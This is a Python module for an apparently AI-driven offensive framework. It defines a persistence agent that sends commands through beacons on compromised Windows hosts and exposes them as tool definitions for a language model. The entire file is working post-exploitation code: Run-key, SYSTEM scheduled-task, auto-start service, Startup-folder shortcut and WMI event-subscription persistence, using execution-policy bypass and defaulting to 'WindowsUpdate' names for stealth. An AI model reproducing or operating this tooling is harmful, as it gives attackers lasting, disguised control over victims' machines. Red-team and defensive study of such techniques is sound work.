"""
PersistenceAgent -- Establish persistence mechanisms via live beacons.

Sends real commands to beacons running on target hosts to install
persistence mechanisms (registry run keys, scheduled tasks, services,
startup folder shortcuts, WMI event subscriptions), parses the stdout
output, and returns structured findings for the orchestrator.
"""

from __future__ import annotations

import logging
import re
import uuid
from typing import Any

from agents.base import AbstractAgent
from orchestrator.task import Task, TaskResult
from server.beacon_handler import beacon_handler

logger = logging.getLogger(__name__)


class PersistenceAgent(AbstractAgent):
    name = "persistence"
    description = (
        "Establishes persistence mechanisms on compromised systems \u2014 "
        "registry run keys, scheduled tasks, services, startup folders, "
        "and WMI event subscriptions via beacons"
    )
    capabilities = [
        "registry_persistence",
        "scheduled_task",
        "create_service",
        "startup_folder",
        "wmi_persistence",
    ]

    # ------------------------------------------------------------------
    # Default timeout (seconds) waiting for beacon to return output.
    # ------------------------------------------------------------------
    BEACON_TIMEOUT = 300

    # ------------------------------------------------------------------
    # execute()
    # ------------------------------------------------------------------

    async def execute(self, task: Task) -> TaskResult:
        action = task.action
        params = task.params

        if action not in self.capabilities:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": f"Unknown action: {action}"},
                summary=f"Persistence agent does not support action '{action}'",
            )

        beacon_id = params.get("beacon_id")
        if not beacon_id:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": "Missing required parameter: beacon_id"},
                summary="Persistence failed: no beacon_id provided",
            )

        timeout = params.get("timeout", self.BEACON_TIMEOUT)

        try:
            handler = getattr(self, f"_handle_{action}")
            return await handler(task, beacon_id, params, timeout)
        except Exception as exc:
            logger.exception(
                "Persistence %s failed on beacon %s", action, beacon_id
            )
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": str(exc)},
                summary=f"Persistence {action} failed: {exc}",
            )

    # ==================================================================
    #  registry_persistence
    # ==================================================================

    async def _handle_registry_persistence(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        """Add a Run-key entry under HKCU to execute a command at logon."""
        command = params.get("command")
        if not command:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": "Missing required parameter: command"},
                summary="registry_persistence failed: no command specified",
            )

        key_name = params.get("key_name", "WindowsUpdate")
        reg_path = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"

        cmd = (
            f'reg add {reg_path} /v {key_name} /t REG_SZ /d "{command}" /f'
        )

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": cmd}, timeout=timeout,
        )
        stdout = self._extract_stdout(result)

        if self._is_error(result):
            return self._error_result(task, "registry_persistence", result)

        success = "successfully" in stdout.lower() or "operation" in stdout.lower()

        # Verify by querying the key back
        verify_cmd = f"reg query {reg_path} /v {key_name}"
        sub_id = str(uuid.uuid4())
        verify_result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": verify_cmd}, timeout=timeout,
        )
        verify_stdout = self._extract_stdout(verify_result)

        verified = key_name in verify_stdout and command in verify_stdout

        persistence_entry = {
            "key": key_name,
            "type": "registry_run",
            "location": f"{reg_path}\\{key_name}",
            "command": command,
            "verified": verified,
        }

        return TaskResult(
            task_id=task.id,
            status="success" if (success or verified) else "partial",
            data={
                "raw_output": f"{stdout}\n--- verify ---\n{verify_stdout}",
                "findings": {"persistence": [persistence_entry]},
            },
            summary=(
                f"Registry persistence via beacon {beacon_id}: "
                f"{'installed' if verified else 'attempted'} "
                f"Run key '{key_name}' -> {command}"
            ),
        )

    # ==================================================================
    #  scheduled_task
    # ==================================================================

    async def _handle_scheduled_task(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        """Create a Windows scheduled task for persistent execution."""
        command = params.get("command")
        task_name = params.get("task_name")
        if not command or not task_name:
            missing = []
            if not command:
                missing.append("command")
            if not task_name:
                missing.append("task_name")
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": f"Missing required parameter(s): {', '.join(missing)}"},
                summary=f"scheduled_task failed: missing {', '.join(missing)}",
            )

        schedule = params.get("schedule", "onlogon")
        raw_parts: list[str] = []

        # Map friendly schedule names to schtasks /sc values
        schedule_map = {
            "onlogon": "ONLOGON",
            "onstart": "ONSTART",
            "daily": "DAILY",
            "hourly": "HOURLY",
            "minute": "MINUTE",
            "weekly": "WEEKLY",
            "onidle": "ONIDLE",
        }
        sc_value = schedule_map.get(schedule.lower(), schedule.upper())

        cmd = (
            f'schtasks /create /tn "{task_name}" /tr "{command}" '
            f"/sc {sc_value} /ru SYSTEM /f"
        )

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": cmd}, timeout=timeout,
        )
        stdout = self._extract_stdout(result)
        raw_parts.append(f"--- schtasks /create ---\n{stdout}")

        if self._is_error(result):
            return self._error_result(task, "scheduled_task", result)

        success = "successfully" in stdout.lower() or "success" in stdout.lower()

        # Verify the task exists
        verify_cmd = f'schtasks /query /tn "{task_name}" /fo LIST'
        sub_id = str(uuid.uuid4())
        verify_result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": verify_cmd}, timeout=timeout,
        )
        verify_stdout = self._extract_stdout(verify_result)
        raw_parts.append(f"--- verify ---\n{verify_stdout}")

        verified = task_name in verify_stdout

        persistence_entry = {
            "key": task_name,
            "type": "scheduled_task",
            "task_name": task_name,
            "command": command,
            "schedule": sc_value,
            "run_as": "SYSTEM",
            "verified": verified,
        }

        return TaskResult(
            task_id=task.id,
            status="success" if (success or verified) else "partial",
            data={
                "raw_output": "\n".join(raw_parts),
                "findings": {"persistence": [persistence_entry]},
            },
            summary=(
                f"Scheduled task via beacon {beacon_id}: "
                f"{'created' if verified else 'attempted'} "
                f"'{task_name}' ({sc_value}) -> {command}"
            ),
        )

    # ==================================================================
    #  create_service
    # ==================================================================

    async def _handle_create_service(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        """Create a Windows service for persistence and start it."""
        service_name = params.get("service_name")
        binary_path = params.get("binary_path")
        if not service_name or not binary_path:
            missing = []
            if not service_name:
                missing.append("service_name")
            if not binary_path:
                missing.append("binary_path")
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": f"Missing required parameter(s): {', '.join(missing)}"},
                summary=f"create_service failed: missing {', '.join(missing)}",
            )

        raw_parts: list[str] = []

        # Create the service with auto start
        create_cmd = (
            f'sc create {service_name} binPath= "{binary_path}" start= auto'
        )
        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": create_cmd}, timeout=timeout,
        )
        stdout_create = self._extract_stdout(result)
        raw_parts.append(f"--- sc create ---\n{stdout_create}")

        create_success = "success" in stdout_create.lower()

        # Start the service
        start_cmd = f"sc start {service_name}"
        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": start_cmd}, timeout=timeout,
        )
        stdout_start = self._extract_stdout(result)
        raw_parts.append(f"--- sc start ---\n{stdout_start}")

        # Verify via sc query
        query_cmd = f"sc query {service_name}"
        sub_id = str(uuid.uuid4())
        verify_result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": query_cmd}, timeout=timeout,
        )
        verify_stdout = self._extract_stdout(verify_result)
        raw_parts.append(f"--- sc query ---\n{verify_stdout}")

        verified = service_name.upper() in verify_stdout.upper()
        running = "RUNNING" in verify_stdout.upper()

        persistence_entry = {
            "key": service_name,
            "type": "windows_service",
            "service_name": service_name,
            "binary_path": binary_path,
            "start_type": "auto",
            "running": running,
            "verified": verified,
        }

        return TaskResult(
            task_id=task.id,
            status="success" if (create_success or verified) else "partial",
            data={
                "raw_output": "\n".join(raw_parts),
                "findings": {"persistence": [persistence_entry]},
            },
            summary=(
                f"Service persistence via beacon {beacon_id}: "
                f"{'created and ' + ('started' if running else 'start pending') if verified else 'attempted'} "
                f"service '{service_name}' -> {binary_path}"
            ),
        )

    # ==================================================================
    #  startup_folder
    # ==================================================================

    async def _handle_startup_folder(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        """Place a payload or shortcut in the user's Startup folder."""
        payload_path = params.get("payload_path")
        if not payload_path:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": "Missing required parameter: payload_path"},
                summary="startup_folder failed: no payload_path specified",
            )

        link_name = params.get("link_name", "WindowsUpdate")
        raw_parts: list[str] = []

        # Discover the current username for the Startup path
        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": "whoami"}, timeout=timeout,
        )
        whoami_stdout = self._extract_stdout(result)
        raw_parts.append(f"--- whoami ---\n{whoami_stdout}")

        # Extract just the username portion (DOMAIN\user -> user)
        username = whoami_stdout.strip()
        if "\\" in username:
            username = username.split("\\")[-1]

        startup_dir = (
            f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\"
            f"Start Menu\\Programs\\Startup"
        )

        # Create a .lnk shortcut via PowerShell
        ps_cmd = (
            f'powershell -ep bypass -c "'
            f"$ws = New-Object -ComObject WScript.Shell; "
            f"$sc = $ws.CreateShortcut('{startup_dir}\\{link_name}.lnk'); "
            f"$sc.TargetPath = '{payload_path}'; "
            f"$sc.Save(); "
            f"Write-Output 'SHORTCUT_CREATED'"
            f'"'
        )

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": ps_cmd}, timeout=timeout,
        )
        stdout = self._extract_stdout(result)
        raw_parts.append(f"--- create shortcut ---\n{stdout}")

        if self._is_error(result):
            return self._error_result(task, "startup_folder", result)

        created = "SHORTCUT_CREATED" in stdout

        # Verify the shortcut exists
        verify_cmd = f'dir "{startup_dir}\\{link_name}.lnk"'
        sub_id = str(uuid.uuid4())
        verify_result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": verify_cmd}, timeout=timeout,
        )
        verify_stdout = self._extract_stdout(verify_result)
        raw_parts.append(f"--- verify ---\n{verify_stdout}")

        verified = f"{link_name}.lnk" in verify_stdout

        persistence_entry = {
            "key": link_name,
            "type": "startup_folder",
            "link_name": f"{link_name}.lnk",
            "target_path": payload_path,
            "startup_dir": startup_dir,
            "verified": verified,
        }

        return TaskResult(
            task_id=task.id,
            status="success" if (created or verified) else "partial",
            data={
                "raw_output": "\n".join(raw_parts),
                "findings": {"persistence": [persistence_entry]},
            },
            summary=(
                f"Startup folder persistence via beacon {beacon_id}: "
                f"{'installed' if verified else 'attempted'} "
                f"shortcut '{link_name}.lnk' -> {payload_path}"
            ),
        )

    # ==================================================================
    #  wmi_persistence
    # ==================================================================

    async def _handle_wmi_persistence(
        self, task: Task, beacon_id: str, params: dict, timeout: float
    ) -> TaskResult:
        """Create a WMI event subscription for persistence.

        Creates three WMI objects:
        1. __EventFilter       -- triggers on the chosen event (startup, etc.)
        2. CommandLineEventConsumer -- runs the specified command
        3. __FilterToConsumerBinding -- links filter to consumer
        """
        command = params.get("command")
        if not command:
            return TaskResult(
                task_id=task.id,
                status="failure",
                data={"error": "Missing required parameter: command"},
                summary="wmi_persistence failed: no command specified",
            )

        event_filter = params.get("event_filter", "startup")
        raw_parts: list[str] = []

        # Choose WQL query based on event_filter type
        if event_filter == "startup":
            wql_query = (
                "SELECT * FROM __InstanceModificationEvent WITHIN 60 "
                "WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' "
                "AND TargetInstance.SystemUpTime >= 120 "
                "AND TargetInstance.SystemUpTime < 325"
            )
        elif event_filter == "logon":
            wql_query = (
                "SELECT * FROM __InstanceCreationEvent WITHIN 15 "
                "WHERE TargetInstance ISA 'Win32_LogonSession' "
                "AND TargetInstance.LogonType = 2"
            )
        elif event_filter == "process":
            wql_query = (
                "SELECT * FROM __InstanceCreationEvent WITHIN 10 "
                "WHERE TargetInstance ISA 'Win32_Process' "
                "AND TargetInstance.Name = 'explorer.exe'"
            )
        else:
            wql_query = event_filter  # Allow raw WQL passthrough

        filter_name = f"RedNerve_{event_filter}_Filter"
        consumer_name = f"RedNerve_{event_filter}_Consumer"

        # Escape single quotes for PowerShell string embedding
        escaped_command = command.replace("'", "''")
        escaped_wql = wql_query.replace("'", "''")

        # Build a single PowerShell script that creates all three WMI objects
        ps_script = (
            f"powershell -ep bypass -c \""
            f"$filterArgs = @{{"
            f"Name='{filter_name}';"
            f"EventNameSpace='root\\\\cimv2';"
            f"QueryLanguage='WQL';"
            f"Query='{escaped_wql}'"
            f"}}; "
            f"$filter = Set-WmiInstance -Namespace root/subscription "
            f"-Class __EventFilter -Arguments $filterArgs; "
            f"Write-Output ('FILTER_CREATED:' + $filter.Name); "
            f""
            f"$consumerArgs = @{{"
            f"Name='{consumer_name}';"
            f"CommandLineTemplate='{escaped_command}'"
            f"}}; "
            f"$consumer = Set-WmiInstance -Namespace root/subscription "
            f"-Class CommandLineEventConsumer -Arguments $consumerArgs; "
            f"Write-Output ('CONSUMER_CREATED:' + $consumer.Name); "
            f""
            f"$bindingArgs = @{{"
            f"Filter=$filter;"
            f"Consumer=$consumer"
            f"}}; "
            f"$binding = Set-WmiInstance -Namespace root/subscription "
            f"-Class __FilterToConsumerBinding -Arguments $bindingArgs; "
            f"Write-Output 'BINDING_CREATED'; "
            f"\""
        )

        sub_id = str(uuid.uuid4())
        result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": ps_script}, timeout=timeout,
        )
        stdout = self._extract_stdout(result)
        raw_parts.append(f"--- WMI subscription ---\n{stdout}")

        if self._is_error(result):
            return self._error_result(task, "wmi_persistence", result)

        filter_created = f"FILTER_CREATED:{filter_name}" in stdout
        consumer_created = f"CONSUMER_CREATED:{consumer_name}" in stdout
        binding_created = "BINDING_CREATED" in stdout

        # Verify by querying the subscription
        verify_cmd = (
            'powershell -ep bypass -c "'
            "Get-WmiObject -Namespace root/subscription "
            f"-Class __EventFilter -Filter \"Name='{filter_name}'\" | "
            "Select-Object Name | Format-List"
            '"'
        )
        sub_id = str(uuid.uuid4())
        verify_result = await beacon_handler.submit_task(
            beacon_id, sub_id, "run_command",
            {"command": verify_cmd}, timeout=timeout,
        )
        verify_stdout = self._extract_stdout(verify_result)
        raw_parts.append(f"--- verify ---\n{verify_stdout}")

        verified = filter_name in verify_stdout

        persistence_entry = {
            "key": filter_name,
            "type": "wmi_event_subscription",
            "filter_name": filter_name,
            "consumer_name": consumer_name,
            "event_type": event_filter,
            "wql_query": wql_query,
            "command": command,
            "filter_created": filter_created,
            "consumer_created": consumer_created,
            "binding_created": binding_created,
            "verified": verified,
        }

        all_created = filter_created and consumer_created and binding_created

        return TaskResult(
            task_id=task.id,
            status="success" if (all_created or verified) else "partial",
            data={
                "raw_output": "\n".join(raw_parts),
                "findings": {"persistence": [persistence_entry]},
            },
            summary=(
                f"WMI persistence via beacon {beacon_id}: "
                f"{'installed' if all_created else 'partially installed'} "
                f"event subscription ({event_filter}) -> {command}"
            ),
        )

    # ==================================================================
    #  Output parsing helpers
    # ==================================================================

    @staticmethod
    def _extract_stdout(result: dict) -> str:
        """Pull the stdout string from a beacon result dict."""
        if not result:
            return ""
        data = result.get("data", result)
        if isinstance(data, dict):
            return data.get("stdout", data.get("output", ""))
        return str(data)

    @staticmethod
    def _is_error(result: dict) -> bool:
        if not result:
            return True
        status = result.get("status", "")
        return status in ("timeout", "error", "failure")

    def _error_result(self, task: Task, action: str, result: dict) -> TaskResult:
        error_msg = result.get("error", "Unknown beacon error")
        return TaskResult(
            task_id=task.id,
            status="failure",
            data={"error": error_msg, "raw_result": result},
            summary=f"Persistence {action} failed: {error_msg}",
        )

    # ==================================================================
    #  Capabilities manifest (Anthropic tool-use format)
    # ==================================================================

    def get_capabilities_manifest(self) -> dict:
        beacon_id_prop = {
            "type": "string",
            "description": "ID of the beacon to execute through",
        }

        return {
            "name": self.name,
            "description": self.description,
            "tools": [
                {
                    "name": "persistence_registry_persistence",
                    "description": (
                        "Add a registry Run key under HKCU for persistence "
                        "via a beacon. Creates an entry at "
                        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
                        "that executes the specified command at user logon. "
                        "Verifies installation by querying the key back."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                            "command": {
                                "type": "string",
                                "description": (
                                    "The command or binary path to execute at logon."
                                ),
                            },
                            "key_name": {
                                "type": "string",
                                "description": (
                                    "Registry value name for the Run key entry. "
                                    "Defaults to 'WindowsUpdate' for stealth."
                                ),
                            },
                        },
                        "required": ["beacon_id", "command"],
                    },
                },
                {
                    "name": "persistence_scheduled_task",
                    "description": (
                        "Create a Windows scheduled task for persistent command "
                        "execution via a beacon. Supports various schedules "
                        "including ONLOGON, ONSTART, DAILY, HOURLY, MINUTE, "
                        "and WEEKLY. Runs as SYSTEM by default. Verifies "
                        "creation by querying the task."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                            "command": {
                                "type": "string",
                                "description": "The command to execute on the schedule.",
                            },
                            "task_name": {
                                "type": "string",
                                "description": (
                                    "Name for the scheduled task (e.g., "
                                    "'WindowsUpdateCheck')."
                                ),
                            },
                            "schedule": {
                                "type": "string",
                                "enum": [
                                    "onlogon", "onstart", "daily",
                                    "hourly", "minute", "weekly", "onidle",
                                ],
                                "description": (
                                    "Schedule trigger type. Defaults to 'onlogon'."
                                ),
                            },
                        },
                        "required": ["beacon_id", "command", "task_name"],
                    },
                },
                {
                    "name": "persistence_create_service",
                    "description": (
                        "Create a Windows service for persistence via a beacon. "
                        "Uses 'sc create' with auto-start and then starts the "
                        "service. Verifies creation and running state via "
                        "'sc query'."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                            "service_name": {
                                "type": "string",
                                "description": (
                                    "Name for the Windows service (e.g., "
                                    "'WindowsUpdateSvc')."
                                ),
                            },
                            "binary_path": {
                                "type": "string",
                                "description": (
                                    "Full path to the service binary executable."
                                ),
                            },
                        },
                        "required": ["beacon_id", "service_name", "binary_path"],
                    },
                },
                {
                    "name": "persistence_startup_folder",
                    "description": (
                        "Place a shortcut (.lnk) in the current user's Startup "
                        "folder via a beacon. The shortcut points to the "
                        "specified payload path and executes at user logon. "
                        "Uses WScript.Shell COM object to create the shortcut."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                            "payload_path": {
                                "type": "string",
                                "description": (
                                    "Full path to the payload binary the shortcut "
                                    "should point to."
                                ),
                            },
                            "link_name": {
                                "type": "string",
                                "description": (
                                    "Name for the shortcut file (without .lnk "
                                    "extension). Defaults to 'WindowsUpdate'."
                                ),
                            },
                        },
                        "required": ["beacon_id", "payload_path"],
                    },
                },
                {
                    "name": "persistence_wmi_persistence",
                    "description": (
                        "Create a WMI event subscription for persistence via a "
                        "beacon. Installs an __EventFilter, a "
                        "CommandLineEventConsumer, and a "
                        "__FilterToConsumerBinding in the root/subscription "
                        "namespace. Supports startup, logon, and process-based "
                        "event triggers, or raw WQL queries."
                    ),
                    "input_schema": {
                        "type": "object",
                        "properties": {
                            "beacon_id": beacon_id_prop,
                            "command": {
                                "type": "string",
                                "description": (
                                    "The command to execute when the event fires."
                                ),
                            },
                            "event_filter": {
                                "type": "string",
                                "description": (
                                    "Event trigger type: 'startup' (fires ~2 min "
                                    "after boot), 'logon' (interactive logon), "
                                    "'process' (explorer.exe launch), or a raw WQL "
                                    "query string. Defaults to 'startup'."
                                ),
                            },
                        },
                        "required": ["beacon_id", "command"],
                    },
                },
            ],
        }
